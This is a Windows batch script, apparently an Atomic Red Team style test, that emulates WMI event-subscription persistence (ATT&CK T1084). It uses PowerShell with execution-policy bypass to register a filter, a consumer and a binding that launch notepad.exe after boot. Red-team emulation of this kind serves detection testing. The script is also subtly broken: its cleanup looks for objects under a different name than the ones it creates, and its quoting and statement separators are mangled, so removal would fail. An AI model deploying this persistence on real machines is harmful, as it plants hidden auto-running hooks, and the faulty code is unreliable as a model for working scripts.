@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: WMI Persistence - Command Line Event Consumer	(T1084)
ECHO.
ECHO [+] Achieve Persistence using WMI
ECHO -------------------------------------------------------------------
powershell -ep bypass $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example'; CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs $FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
	  

powershell -ep bypass $EventConsumerToCleanup = \"Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'T1084-WMIPersistence-Example'";\" 
powershell -ep bypass $EventFilterToCleanup = \"Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'T1084-WMIPersistence-Example'";\"
powershell -ep bypass $FilterConsumerBindingToCleanup = "Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"";
powershell -ep bypass $FilterConsumerBindingToCleanup | powershell Remove-WmiObject;
powershell -ep bypass $EventConsumerToCleanup | powershell Remove-WmiObject;
powershell -ep bypass $EventFilterToCleanup | powershell Remove-WmiObject"
ECHO. 


